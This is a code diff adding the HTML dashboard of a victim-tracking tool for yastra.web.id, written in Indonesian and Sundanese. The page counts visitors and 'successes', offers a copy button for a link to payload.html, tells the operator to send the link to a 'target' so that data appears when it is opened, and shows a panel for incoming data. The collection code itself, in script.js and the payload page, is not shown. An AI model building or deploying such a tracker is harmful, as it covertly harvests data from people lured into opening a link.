@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tracker — yastra.web.id</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>✦ <span>Tracker</span></h1>
+            <p class="sub">Dashboard — yastra.web.id</p>
+        </header>
+
+        <div class="stats">
+            <div class="stat-card">
+                <span class="stat-label">Total Visitors</span>
+                <span class="stat-value" id="totalVisitors">0</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-label">Total Data</span>
+                <span class="stat-value" id="totalData">0</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-label">Berhasil</span>
+                <span class="stat-value highlight" id="totalSuccess">0</span>
+            </div>
+        </div>
+
+        <div class="tools">
+            <h2>✦ Buat Link</h2>
+            <div class="input-group">
+                <input type="text" id="linkInput" readonly value="https://yastra.web.id/payload.html">
+                <button class="btn" id="copyBtn">Salin</button>
+            </div>
+            <p class="hint">Kirim link ieu ka target. Saat dibuka, data bakal muncul di dashboard.</p>
+        </div>
+
+        <div class="logs">
+            <h2>✦ Data Masuk</h2>
+            <div id="logContainer">
+                <p class="empty">Tunggu data datang...</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
